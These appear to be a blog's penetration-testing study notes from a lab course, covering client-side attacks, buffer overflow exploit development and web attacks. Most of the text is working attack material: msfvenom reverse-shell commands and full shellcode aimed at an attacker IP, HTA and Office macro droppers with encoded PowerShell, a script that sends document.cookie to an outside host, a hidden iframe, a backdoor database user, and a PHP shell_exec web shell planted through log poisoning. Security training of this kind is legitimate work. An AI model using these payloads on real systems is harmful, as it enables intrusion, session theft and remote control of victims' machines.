<h1 id="Uploading-Files-with-TFTP"><a href="#Uploading-Files-with-TFTP" class="headerlink" title="Uploading Files with TFTP"></a>Uploading Files with TFTP</h1><p>xp, 2003  </p>
<p>sudo chown nobody: /tftp<br>sudo atftpd –daemon –port 69 /tftp    </p>
<p>in windows:<br>tftp -i 10.11.0.4 put important.docx  </p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/21/Study-Notes-2021-03-21/">Study Notes - 2021/03/21</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-21</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Client-side-Attack"><a href="#Client-side-Attack" class="headerlink" title="Client-side Attack"></a>Client-side Attack</h1><h2 id="Passive-Client-information-Gathering"><a href="#Passive-Client-information-Gathering" class="headerlink" title="Passive Client information Gathering"></a>Passive Client information Gathering</h2><p>Googled for various known external corporate IP addresses and found one on a site that hosts collected user agent data from various affiliate sites.</p>
<h2 id="Active-Client-information-Gathering"><a href="#Active-Client-information-Gathering" class="headerlink" title="Active Client information Gathering"></a>Active Client information Gathering</h2><h2 id="Social-engineering-and-client-side-attacks"><a href="#Social-engineering-and-client-side-attacks" class="headerlink" title="Social engineering and client-side attacks"></a>Social engineering and client-side attacks</h2><p>Cheat HR, by sending their a document, and ask what types of os and broseswer they are using </p>
<h2 id="Client-Fingerprinting"><a href="#Client-Fingerprinting" class="headerlink" title="Client Fingerprinting"></a>Client Fingerprinting</h2><p>fingerpringjs  </p>
<p>use ajax to post components array to the server  </p>
<p>sudo chown www-data:www-data fp  </p>
<h2 id="Leveraging-HTML-Applications"><a href="#Leveraging-HTML-Applications" class="headerlink" title="Leveraging HTML Applications"></a>Leveraging HTML Applications</h2><p>If a file is created with the extension of .hta instead of .html, Internet Explorer will automatically nterpret it as a HTML Application and offer the ability to execute it using the mshta.exe program.</p>
<p>work with IE </p>
<p>Similar to an HTML page, a typical HTML Application includes html, body, and script tags followed by JavaScript or VBScript code. However, since the HTML Application is executed outside the browser we are free to use legacy and dangerous features that are often blocked within the browser  </p>
<p>An additional window will open, add close </p>
<p>``</p>
<html>
<head>
<script>
var c= 'cmd.exe'
new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>
self.close();
</script>
</body>
</html>
``

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.119.148 LPORT&#x3D;4444 -f hta-psh -o &#x2F;var&#x2F;www&#x2F;html&#x2F;evil.hta</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iKqr8BWFyuiK.Run &quot;powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcg</span><br></pre></td></tr></table></figure>

<p>-nop no profile<br>-w hidden do not pop up a window<br>-EncodedCommand  -e  </p>
<h1 id="Microsoft-macros"><a href="#Microsoft-macros" class="headerlink" title="Microsoft macros"></a>Microsoft macros</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Sub AutoOpen()</span><br><span class="line">MyMacro</span><br><span class="line">End Sub</span><br><span class="line">Sub Document_Open()</span><br><span class="line">MyMacro</span><br><span class="line">End Sub</span><br><span class="line">Sub MyMacro()</span><br><span class="line">CreateObject(&quot;Wscript.Shell&quot;).Run &quot;cmd&quot;</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>

<p>We must save the containing document as either .docm or the older .doc format, which supports<br>embedded macros, but must avoid the .docx format, which does not support them.</p>
<h1 id="Object-Linking-and-Emedding"><a href="#Object-Linking-and-Emedding" class="headerlink" title="Object Linking and Emedding"></a>Object Linking and Emedding</h1><p>Insert batch object into a word file<br>change the present, display as icon, change the icon<br>Can also change caption<br>user need to click on the icon to lanuch the batch file  </p>
<p>START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj….  </p>
<h1 id="Evading-Protected-View"><a href="#Evading-Protected-View" class="headerlink" title="Evading Protected View"></a>Evading Protected View</h1><p>block the execution of macro and embeded object<br>bypass is to use another Office application.  </p>
<h1 id="Locating-public-exploits"><a href="#Locating-public-exploits" class="headerlink" title="Locating public exploits"></a>Locating public exploits</h1><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com</a>  </p>
<p><a target="_blank" rel="noopener" href="https://www.securityfocus.com/">https://www.securityfocus.com</a><br>A vulnerability database instead of exploit database, reference may contain some PoC </p>
<p><a target="_blank" rel="noopener" href="https://packetstormsecurity.com/">https://packetstormsecurity.com</a><br>It provides up-to-date information on security news and vulnerabilities as well as recently published tools by security vendors</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firefox --search &quot;Microsoft Edge site:exploit-db.com&quot;</span><br></pre></td></tr></table></figure>
<p>inurl intext and intitle  </p>
<h1 id="Offline-exploit-resource"><a href="#Offline-exploit-resource" class="headerlink" title="Offline exploit resource"></a>Offline exploit resource</h1><p>SearchSploit  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update &amp;&amp; sudo apt install exploitdb</span><br></pre></td></tr></table></figure>
<p>to make sure it is lateset  </p>
<p>/usr/share/exploitdb/exploits/  </p>
<h1 id="nmap-NSE-script"><a href="#nmap-NSE-script" class="headerlink" title="nmap NSE script"></a>nmap NSE script</h1><p>kali@kali:~$ cd /usr/share/nmap/scripts<br>kali@kali:/usr/share/nmap/scripts$ grep Exploits *.nse<br>nmap –script-help=clamav-exec.nse  </p>
<h1 id="The-Browser-Exploitation-Framework-BeEF"><a href="#The-Browser-Exploitation-Framework-BeEF" class="headerlink" title="The Browser Exploitation Framework (BeEF)"></a>The Browser Exploitation Framework (BeEF)</h1><h1 id="Metasploit-Framework"><a href="#Metasploit-Framework" class="headerlink" title="Metasploit Framework"></a>Metasploit Framework</h1><h1 id="Put-all-together"><a href="#Put-all-together" class="headerlink" title="Put all together"></a>Put all together</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap 10.11.0.128 -p- -sV -vv --open --reason</span><br></pre></td></tr></table></figure>
<p>  –open: Only show open (or possibly open) ports<br>  –reason: Display the reason a port is in a particular state  </p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/20/Study-Notes-2021-03-20/">Study Notes - 2021/03/20</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-20</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Linux-Buffer-Overflow"><a href="#Linux-Buffer-Overflow" class="headerlink" title="Linux Buffer Overflow"></a>Linux Buffer Overflow</h1><h2 id="DEP-data-execution-prevention-ASLR-Canaries"><a href="#DEP-data-execution-prevention-ASLR-Canaries" class="headerlink" title="DEP (data execution prevention), ASLR, Canaries"></a>DEP (data execution prevention), ASLR, Canaries</h2><h1 id="replicating-the-crash"><a href="#replicating-the-crash" class="headerlink" title="replicating the crash"></a>replicating the crash</h1><h1 id="controlling-EIP"><a href="#controlling-EIP" class="headerlink" title="controlling EIP"></a>controlling EIP</h1><h2 id="find-the-eip-location-use-msf-pattern-create"><a href="#find-the-eip-location-use-msf-pattern-create" class="headerlink" title="find the eip location, use msf-pattern_create"></a>find the eip location, use msf-pattern_create</h2><p><code>msf-pattern_create -l 4379</code><br>eip = 0x46367046<br><code>msf-pattern_offset -q 46367046</code><br>-q, –query Aa0A                 Query to Locate  </p>
<p>offset = 4368</p>
<p>crash = “\x41” * 4368 + “B” * 4 + “C” * 7  </p>
<h2 id="locating-space-for-shell-code"><a href="#locating-space-for-shell-code" class="headerlink" title="locating space for shell code"></a>locating space for shell code</h2><p>find a register that point to our buffer:<br>esp point to the end of our buffer, only have 7 bytes remaining in the buffer, increase buffer size not work, lead to another crash<br>eax point to the start of the buffer, including the “setup sound” string </p>
<p>right click -&gt; go to expression (setup sound)<br>“se” -&gt;  translate to <code>jae</code> jump short if above or equal<br>“tu” -&gt;  <code>je</code> jump if equal<br>not good  </p>
<p>insert first stage shell code at the 7 bytes space<br>use to allain eax to point to string after setup sound, then jump to there </p>
<p>increase eax+12 as there are 12 chars in “setup sound”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ msf-nasm_shell</span><br><span class="line">nasm &gt; add eax,12</span><br><span class="line">00000000 83C00C add eax,byte +0xc</span><br><span class="line">nasm &gt; jmp eax</span><br><span class="line">00000000 FFE0 jmp eax</span><br></pre></td></tr></table></figure>

<p>5 bytes instructions 83C00C FFE0</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">padding &#x3D; &quot;\x41&quot; * 4368</span><br><span class="line">eip &#x3D; &quot;\x42\x42\x42\x42&quot;</span><br><span class="line">first_stage &#x3D; &quot;\x83\xc0\x0c\xff\xe0\x90\x90&quot;  # padding with nops</span><br><span class="line"></span><br><span class="line">buffer &#x3D; &quot;\x11(setup sound &quot; + padding + eip + first_stage + &quot;\x90\x00#&quot;</span><br></pre></td></tr></table></figure>


<h2 id="checking-for-bad-chars"><a href="#checking-for-bad-chars" class="headerlink" title="checking for bad chars"></a>checking for bad chars</h2><p>We sent the whole range of characters from 00 to FF within our buffer and then monitored<br>whether any of those bytes got mangled, swapped, dropped, or changed in memory once they<br>were processed by the application.</p>
<p>0x00 0x20  </p>
<h2 id="finding-a-return-address"><a href="#finding-a-return-address" class="headerlink" title="finding a return address"></a>finding a return address</h2><p>edb Plugins -&gt; OpcodeSearcher<br>0x8134596  </p>
<h2 id="getting-a-shell"><a href="#getting-a-shell" class="headerlink" title="getting a shell"></a>getting a shell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.119.148 LPORT&#x3D;443 -b &quot;\x00\x20&quot; -f py -v shellcode</span><br></pre></td></tr></table></figure>

<p>the output format with<br>-f, and the variable name to use with -v.  </p>
<p>shell is stucked, because of debugger</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/16/Study-Notes-2021-03-17/">Study Notes - 2021/03/17</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-16</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><h1 id="Buffer-Overflow"><a href="#Buffer-Overflow" class="headerlink" title="Buffer Overflow"></a>Buffer Overflow</h1><h1 id="Immunity-Debug"><a href="#Immunity-Debug" class="headerlink" title="Immunity Debug"></a>Immunity Debug</h1><p>F2 set break point<br>F9 to run the program<br>F7 step into the function<br>Ctrl + F9 execute until the return of the function  </p>
<h1 id="Windows-Buffer-Overflows"><a href="#Windows-Buffer-Overflows" class="headerlink" title="Windows Buffer Overflows"></a>Windows Buffer Overflows</h1><h2 id="Discover-the-vulnerability"><a href="#Discover-the-vulnerability" class="headerlink" title="Discover the vulnerability"></a>Discover the vulnerability</h2><ol>
<li>source code review</li>
<li>reverse engineering </li>
<li>fuzzing  </li>
</ol>
<h1 id="Fuzzing-the-http-protocal"><a href="#Fuzzing-the-http-protocal" class="headerlink" title="Fuzzing the http protocal"></a>Fuzzing the http protocal</h1><h2 id="get-seed"><a href="#get-seed" class="headerlink" title="get seed"></a>get seed</h2><p>use wireshark to capture packages<br>capture filter <code>host 192.168.119.148 and host 192.168.148.10</code><br>locate the /login page and right click <code>follow tcp stream</code>  – apply display filters  </p>
<p>TCP View Stored at: <code>C:\Tools\windows_buffer_overflows</code>  find the process listening on port 80<br>Run Immunity Debug with admin  </p>
<h2 id="Replicate-the-crash"><a href="#Replicate-the-crash" class="headerlink" title="Replicate the crash"></a>Replicate the crash</h2><h2 id="Control-EIP"><a href="#Control-EIP" class="headerlink" title="Control EIP"></a>Control EIP</h2><h3 id="Binary-Search"><a href="#Binary-Search" class="headerlink" title="Binary Search"></a>Binary Search</h3><p>AAAABBBB, then AAAABBCC then AAAABBCD until locate the eip  </p>
<p>generate non-repeat pattern<br><code>msf-pattern_create -l 800</code>  </p>
<p>eip replaced with <code>42306142</code>  -&gt; <code>B0aB</code>  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ msf-pattern_offset -l 800 -q 42306142                                                                          </span><br><span class="line">[*] Exact match at offset 780</span><br></pre></td></tr></table></figure>

<h2 id="Locating-space-for-shell-code"><a href="#Locating-space-for-shell-code" class="headerlink" title="Locating space for shell code"></a>Locating space for shell code</h2><p>usually shell code length 350 - 400 bytes<br>esp locate at BBBBCCCCESP!  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">filler &#x3D; &quot;A&quot; * 780</span><br><span class="line">eip &#x3D; &quot;B&quot; * 4</span><br><span class="line">offset &#x3D; &quot;C&quot; * 4</span><br><span class="line">buffer &#x3D; &quot;D&quot; * (1500 - len(filler) - len(eip) - len(offset))</span><br><span class="line">inputBuffer &#x3D; filler + eip + offset + buffer</span><br><span class="line">&#96;&#96;&#96;  </span><br><span class="line">esp point to buffer  </span><br><span class="line"></span><br><span class="line">## checking for bad chars</span><br><span class="line">&#96;0x00&#96;  use to terminate string  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>badchars = (<br>“\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10”<br>“\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20”<br>“\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30”<br>“\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40”<br>“\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50”<br>“\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60”<br>“\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70”<br>“\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80”<br>“\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90”<br>“\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0”<br>“\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0”<br>“\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0”<br>“\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0”<br>“\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0”<br>“\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0”<br>“\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff” )</p>
<p>inputBuffer = filler + eip + offset + badchars</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">right click esp, follow in dump: find that char after 0x09 not appear  means 0x0a is a bad char (line feed, terminate the http field)  </span><br><span class="line"></span><br><span class="line">remove 0x0a from the barchar and repeat, find 0x0d (return char) is also bad  </span><br><span class="line">all bad char &#96;0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B 0x3D&#96;   </span><br><span class="line"></span><br><span class="line">## redirecting the execution flow</span><br><span class="line">the address differ from crash to crash  </span><br><span class="line">## find return address  </span><br><span class="line">JMP ESP  </span><br><span class="line">the addresses used in the library must be static, eliminates libraries compiled with ASLR support </span><br><span class="line">the **address** can not contain any bar char  </span><br><span class="line"></span><br><span class="line">use !mona modules</span><br></pre></td></tr></table></figure>
<p>Log data, item 7<br> Address=0BADF00D<br> Message= 0x00400000 | 0x00462000 | 0x00062000 | False  | False   | False |  False   | False  | -1.0- [syncbrs.exe] (C:\Program Files\Sync Breeze Enterprise\bin\syncbrs.exe)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">however the address leading with &#96;0x00&#96;  </span><br></pre></td></tr></table></figure>
<p>Log data, item 10<br> Address=0BADF00D<br> Message= 0x10000000 | 0x10223000 | 0x00223000 | False  | False   | False |  False   | False  | -1.0- [libspp.dll] (C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tip: If this application was compiled with DEP support, our JMP ESP</span><br><span class="line">address would have to be located in the .text code segment of the module  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>kali@kali:~$ msf-nasm_shell<br>nasm &gt; jmp esp<br>00000000 FFE4 jmp esp<br>nasm &gt;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;!mona find -s &quot;\xff\xe4&quot; -m &quot;libspp.dll&quot;&#96;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Log data, item 3<br> Address=10090C83<br> Message=  0x10090c83 : “\xff\xe4” |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">JMP ESP instruction (0x10090c83)  </span><br><span class="line">eip &#x3D; &quot;\x83\x0c\x09\x10&quot;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## generate shell code with metasploit  </span><br><span class="line">&#96;msfvenom -l payloads&#96;  list available playload  </span><br><span class="line">&#96;msfvenom -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.119.148 LPORT&#x3D;443 -f c&#96;  </span><br><span class="line">-p payload  </span><br><span class="line">-f to select C-formatted shellcode.  </span><br></pre></td></tr></table></figure>
<p>└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.148 LPORT=443 -f c<br>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br>[-] No arch selected, selecting arch: x86 from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 324 bytes<br>Final size of c file: 1386 bytes<br>unsigned char buf[] =<br>“\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30”<br>“\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff”<br>“\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52”<br>“\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1”<br>“\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b”<br>“\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03”<br>“\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b”<br>“\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24”<br>“\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb”<br>“\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c”<br>“\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68”<br>“\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68”<br>“\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x77\x94\x68”<br>“\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61”<br>“\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2”<br>“\x56\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6”<br>“\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01\x01\x8d\x44”<br>“\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46\x56\x4e\x56\x56”<br>“\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff”<br>“\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6”<br>“\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb”<br>“\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5”;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include bad chars  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.148 LPORT=443 -f c –e x86/shikata_ga_nai -b “\x00\x0a\x0d\x25\x26\x2b\x3d”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-b bad char  </span><br><span class="line">-e encoder  </span><br><span class="line"></span><br><span class="line">the decoder (getPC routine) in the shell code modify the stack thus modify the decoder code it self.  </span><br><span class="line"></span><br><span class="line">create landing path, add many nops (\x90) </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>nops = “\x90” * 10<br>inputBuffer = filler + eip + offset + nops + shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>sudo nc -lnvp 443  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Yeah!!  </span><br><span class="line"></span><br><span class="line">But when we exit the shell, the sync breeze crash and exit  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## improving the exploit  </span><br><span class="line">Using ExitThread instead of ExitProcess</span><br></pre></td></tr></table></figure>
<p>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.148 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b “\x00\x0a\x0d\x25\x26\x2b\x3d”</p>
<pre><code>
</code></pre>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/03/16/Study-Notes-2021-03-16/">Study Notes - 2021/03/16</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-03-16</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Study-Notes/">Study Notes</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Penetration-Testing/">Penetration Testing</a></span><div class="content"><p>Use phpmyadmin to execute arbitrary sql  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from webappdb.users;</span><br><span class="line">insert into webappdb.users(password, username) VALUES (&quot;backdoor&quot;,&quot;backdoor&quot;);</span><br></pre></td></tr></table></figure>


<h1 id="Cross-Site-Scripting-XSS"><a href="#Cross-Site-Scripting-XSS" class="headerlink" title="Cross-Site Scripting (XSS)"></a>Cross-Site Scripting (XSS)</h1><p>Once we identify an entry point, we can input special characters, and observe the output to see if any of the special characters return unfiltered.</p>
<h1 id="Content-Injection"><a href="#Content-Injection" class="headerlink" title="Content Injection"></a>Content Injection</h1><p>injsect invisible iframe <code>&lt;iframe src=http://192.168.119.148/report height=”0” width=”0”&gt;&lt;/iframe&gt;</code><br>Open listern on attack machine <code>sudo nc -nvlp 80</code><br>can redirect to information gathering script  </p>
<h1 id="Steal-cokie-and-session-information"><a href="#Steal-cokie-and-session-information" class="headerlink" title="Steal cokie and session information"></a>Steal cokie and session information</h1><script>new Image().src="http://192.168.119.148/cool.jpg?output="+document.cookie;</script>

<h1 id="Directory-Traversal-Vulnerabilities"><a href="#Directory-Traversal-Vulnerabilities" class="headerlink" title="Directory Traversal Vulnerabilities"></a>Directory Traversal Vulnerabilities</h1><h2 id="Identify"><a href="#Identify" class="headerlink" title="Identify"></a>Identify</h2><p>find any parameter in the url that looks like a file name<br>e.g. <code>http://192.168.148.10/menu.php?file=current_menu.php</code><br>modify the file to reference files that should be readable by any user on the system, such as<br>/etc/passwd on Linux or c:\boot.ini on Windows  <code>c:\windows\system32\drivers\etc\hosts</code>  </p>
<h1 id="File-inclusion-Vulnerabilities"><a href="#File-inclusion-Vulnerabilities" class="headerlink" title="File inclusion Vulnerabilities"></a>File inclusion Vulnerabilities</h1><p>included file will be executed. </p>
<h2 id="local-file-inclusion-remote-file-inclusion"><a href="#local-file-inclusion-remote-file-inclusion" class="headerlink" title="local file inclusion/remote file inclusion"></a>local file inclusion/remote file inclusion</h2><p>different from where the file included from<br>We must locate<br>parameters we can manipulate and attempt to use them to load arbitrary files. However, a file inclusion takes this one step further, as we attempt execute the contents of the file within the application.  </p>
<h2 id="Contaminating-Log-Files"><a href="#Contaminating-Log-Files" class="headerlink" title="Contaminating Log Files"></a>Contaminating Log Files</h2><p>clear log<br>connect the servier with <code>&lt;?php echo &#39;&lt;pre&gt;&#39; . shell_exec($_GET[&#39;cmd&#39;]) . &#39;&lt;/pre&gt;&#39;;?&gt;</code><br>This output is first wrapped in pre HTML tags, which preserve any line breaks or formatting in the results of the function call.<br>inserted into the access log of apache:<br><code>192.168.119.148 - - [16/Mar/2021:18:18:11 -0700] &quot;&lt;?php echo &#39;&lt;pre&gt;&#39; . shell_exec($_GET[&#39;cmd&#39;]) . &#39;&lt;/pre&gt;&#39;;?&gt;\n&quot; 400 980 &quot;-&quot; &quot;-&quot;</code>  </p>
<p>access the file inclusion url <code>http://192.168.148.10/menu.php?file=c:\xampp\apache\logs\access.log&amp;cmd=ipconfig</code>  </p>
<h2 id="Remote-file-inclusion"><a href="#Remote-file-inclusion" class="headerlink" title="Remote file inclusion"></a>Remote file inclusion</h2><p>Remote file inclusion (RFI) vulnerabilities are less common than LFIs since the server must be configured in a very specific way, but they are usually easier to exploit. For example, PHP apps must be configured with allow_url_include set to “On”.  </p>
